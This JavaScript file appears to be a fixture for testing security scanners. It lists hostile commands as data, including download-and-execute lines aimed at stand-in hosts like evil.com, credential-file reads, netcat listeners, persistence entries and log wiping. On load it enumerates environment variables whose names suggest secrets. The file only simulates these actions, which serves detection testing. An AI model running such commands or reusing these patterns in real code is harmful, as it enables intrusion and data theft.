/**
 * PROCESS AND SYSTEM PATTERNS FOR SECURITY SCANNER TESTING
 * This file contains patterns that should trigger process/system-related security heuristics
 */

const { exec, spawn, execSync, fork } = require('child_process');
const os = require('os');
const process = require('process');

class ProcessController {
    constructor() {
        // Suspicious commands that scanners should flag
        this.SUSPICIOUS_COMMANDS = [
            // System information gathering
            'whoami',
            'id',
            'uname -a',
            'systeminfo',
            'ps aux',
            'tasklist',
            'netstat -an',
            'ifconfig',
            'ipconfig /all',
            
            // Network reconnaissance
            'nmap -sS',
            'ping -c 1000',
            'arp -a',
            'route',
            'ss -tulpn',
            
            // File operations
            'find / -name "*.log" 2>/dev/null',
            'cat /etc/passwd',
            'type C:\\Windows\\System32\\config\\SAM',
            'ls -la /root',
            'dir C:\\Users /s',
            
            // Persistence mechanisms
            'crontab -e',
            'schtasks /create',
            'reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
            'chkconfig --add malware',
            'systemctl enable backdoor',
            
            // Download and execute
            'wget http://malicious.com/payload.sh',
            'curl -s http://evil.com/script | bash',
            'powershell -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/ps1\')"',
            'certutil -urlcache -split -f http://malicious.com/file.exe',
            
            // Privilege escalation
            'sudo su -',
            'su root',
            'runas /user:administrator',
            'chmod +s /bin/bash',
            
            // Anti-forensics
            'history -c',
            'rm ~/.bash_history',
            'del /f /s /q C:\\*.log',
            'shred -vfz -n 3',
            'sdelete -z C:\\'
        ];
        
        this.KEYLOGGER_COMMANDS = [
            'xinput test',
            'showkey',
            'logkeys',
            'python3 -c "import pynput"',
            'GetAsyncKeyState'
        ];
        
        this.BACKDOOR_COMMANDS = [
            'nc -lvp 4444',
            'netcat -l -p 1337',
            'python3 -m http.server 8080',
            'socat TCP-LISTEN:31337',
            'ssh -R 2222:localhost:22'
        ];
    }
    
    // Pattern that looks like executing suspicious commands
    async executeSuspiciousCommands() {
        const results = [];
        
        for (const command of this.SUSPICIOUS_COMMANDS.slice(0, 10)) { // Limit for demo
            console.log(`Would execute suspicious command: ${command}`);
            
            // Don't actually execute, just simulate the pattern
            results.push({
                command: command,
                timestamp: Date.now(),
                status: 'simulated',
                output: 'Command execution simulated for security testing'
            });
        }
        
        return results;
    }
    
    // Pattern that looks like process injection
    async performProcessInjection() {
        const targetProcesses = [
            'explorer.exe',
            'svchost.exe',
            'winlogon.exe',
            'lsass.exe',
            'chrome.exe',
            'firefox.exe'
        ];
        
        for (const target of targetProcesses) {
            console.log(`Would attempt process injection into: ${target}`);
            
            // Simulate finding process ID
            const fakePid = Math.floor(Math.random() * 10000) + 1000;
            console.log(`Target PID: ${fakePid}`);
            
            // Pattern that looks like injection techniques
            const techniques = [
                'DLL_INJECTION',
                'PROCESS_HOLLOWING',
                'THREAD_HIJACKING',
                'MANUAL_DLL_LOADING',
                'REFLECTIVE_DLL_LOADING'
            ];
            
            const technique = techniques[Math.floor(Math.random() * techniques.length)];
            console.log(`Would use injection technique: ${technique}`);
        }
        
        return 'Process injection simulated';
    }
    
    // Pattern that looks like privilege escalation
    async escalatePrivileges() {
        const escalationMethods = [
            'UAC_BYPASS',
            'TOKEN_MANIPULATION',
            'EXPLOIT_KERNEL_VULN',
            'SERVICE_HIJACKING',
            'DLL_HIJACKING',
            'SCHEDULED_TASK_ABUSE'
        ];
        
        for (const method of escalationMethods) {
            console.log(`Would attempt privilege escalation using: ${method}`);
            
            // Simulate checking current privileges
            console.log(`Current user: ${os.userInfo().username}`);
            console.log(`Current privileges: standard_user`);
            console.log(`Target privileges: administrator/root`);
        }
        
        return 'Privilege escalation simulated';
    }
    
    // Pattern that looks like persistence installation
    async installPersistence() {
        const persistenceMethods = [
            {
                type: 'REGISTRY_RUN_KEY',
                location: 'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                value: 'SystemUpdater'
            },
            {
                type: 'STARTUP_FOLDER',
                location: '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup',
                file: 'system_check.exe'
            },
            {
                type: 'CRON_JOB',
                location: '/etc/crontab',
                command: '*/5 * * * * /tmp/.hidden/backdoor'
            },
            {
                type: 'SYSTEMD_SERVICE',
                location: '/etc/systemd/system/system-update.service',
                command: '/usr/local/bin/updater'
            },
            {
                type: 'SCHEDULED_TASK',
                name: 'SystemMaintenance',
                command: 'C:\\Windows\\Temp\\maintenance.exe'
            }
        ];
        
        for (const method of persistenceMethods) {
            console.log(`Would install persistence using: ${method.type}`);
            console.log(`Location: ${method.location}`);
            
            if (method.command) {
                console.log(`Command: ${method.command}`);
            }
            if (method.file) {
                console.log(`File: ${method.file}`);
            }
        }
        
        return 'Persistence installation simulated';
    }
    
    // Pattern that looks like keylogger functionality
    async startKeylogger() {
        console.log('Would start keylogger with the following capabilities:');
        
        const capabilities = [
            'CAPTURE_KEYSTROKES',
            'CAPTURE_MOUSE_CLICKS',
            'CAPTURE_CLIPBOARD',
            'CAPTURE_SCREENSHOTS',
            'CAPTURE_WINDOW_TITLES',
            'CAPTURE_FORM_DATA'
        ];
        
        for (const capability of capabilities) {
            console.log(`- ${capability}: enabled`);
        }
        
        // Pattern that looks like setting up keystroke capture
        for (const command of this.KEYLOGGER_COMMANDS) {
            console.log(`Would execute keylogger command: ${command}`);
        }
        
        return 'Keylogger simulation started';
    }
    
    // Pattern that looks like backdoor setup
    async setupBackdoor() {
        const backdoorConfig = {
            listen_port: 31337,
            bind_address: '0.0.0.0',
            authentication: false,
            encryption: false,
            shell_type: process.platform === 'win32' ? 'cmd.exe' : '/bin/bash',
            auto_start: true,
            hide_window: true
        };
        
        console.log('Would setup backdoor with configuration:', backdoorConfig);
        
        for (const command of this.BACKDOOR_COMMANDS) {
            console.log(`Would execute backdoor command: ${command}`);
        }
        
        return 'Backdoor setup simulated';
    }
    
    // Pattern that looks like system monitoring evasion
    async evadeDetection() {
        const evasionTechniques = [
            'PROCESS_NAME_SPOOFING',
            'MEMORY_PATCHING',
            'HOOK_REMOVAL',
            'DEBUGGER_DETECTION',
            'VM_DETECTION',
            'SANDBOX_DETECTION',
            'SLEEP_EVASION',
            'API_HAMMERING'
        ];
        
        for (const technique of evasionTechniques) {
            console.log(`Would apply evasion technique: ${technique}`);
            
            // Simulate checking for analysis environment
            const checks = {
                'DEBUGGER_DETECTION': 'No debugger detected',
                'VM_DETECTION': 'No VM environment detected',
                'SANDBOX_DETECTION': 'No sandbox detected'
            };
            
            if (checks[technique]) {
                console.log(`Result: ${checks[technique]}`);
            }
        }
        
        return 'Detection evasion simulated';
    }
}

// System utilities with suspicious patterns
const SystemUtils = {
    // Gather comprehensive system information
    gatherSystemInfo() {
        const systemInfo = {
            hostname: os.hostname(),
            platform: os.platform(),
            architecture: os.arch(),
            cpu_count: os.cpus().length,
            total_memory: os.totalmem(),
            free_memory: os.freemem(),
            uptime: os.uptime(),
            user_info: os.userInfo(),
            network_interfaces: Object.keys(os.networkInterfaces()),
            environment_variables: Object.keys(process.env).filter(key => 
                key.includes('TOKEN') || 
                key.includes('KEY') || 
                key.includes('SECRET') ||
                key.includes('PASSWORD') ||
                key.includes('API')
            )
        };
        
        console.log('Would gather system information:', Object.keys(systemInfo));
        return systemInfo;
    },
    
    // Check for security software
    checkSecuritySoftware() {
        const securityProducts = [
            'Windows Defender',
            'Norton',
            'McAfee',
            'Kaspersky',
            'Avast',
            'AVG',
            'Bitdefender',
            'Trend Micro',
            'ESET',
            'Malwarebytes'
        ];
        
        const detected = [];
        
        for (const product of securityProducts) {
            console.log(`Would check for security product: ${product}`);
            detected.push({
                name: product,
                detected: false, // Always false to avoid actual detection
                version: 'unknown'
            });
        }
        
        return detected;
    },
    
    // Pattern that looks like disabling security features
    disableSecurityFeatures() {
        const securityFeatures = [
            'Windows Defender Real-time Protection',
            'Windows Firewall',
            'User Account Control (UAC)',
            'System Restore',
            'Windows Update',
            'Event Logging',
            'AMSI (Anti-Malware Scan Interface)',
            'Protected Mode'
        ];
        
        for (const feature of securityFeatures) {
            console.log(`Would attempt to disable: ${feature}`);
        }
        
        return 'Security feature disabling simulated';
    }
};

// Create instance and simulate immediate suspicious activity
const processController = new ProcessController();

// Pattern that might trigger on module load
console.log('Initializing process control module...');
processController.gatherSystemInfo = SystemUtils.gatherSystemInfo;
processController.gatherSystemInfo();

module.exports = {
    ProcessController,
    SystemUtils,
    processController,
    
    // Export suspicious constants
    COMMON_BACKDOOR_PORTS: [4444, 31337, 1337, 8080, 6666, 7777],
    
    PERSISTENCE_LOCATIONS: [
        'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',
        '/etc/crontab',
        '/etc/systemd/system/',
        '%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
    ],
    
    TARGET_PROCESSES: [
        'explorer.exe',
        'svchost.exe',
        'winlogon.exe',
        'chrome.exe',
        'firefox.exe'
    ]
};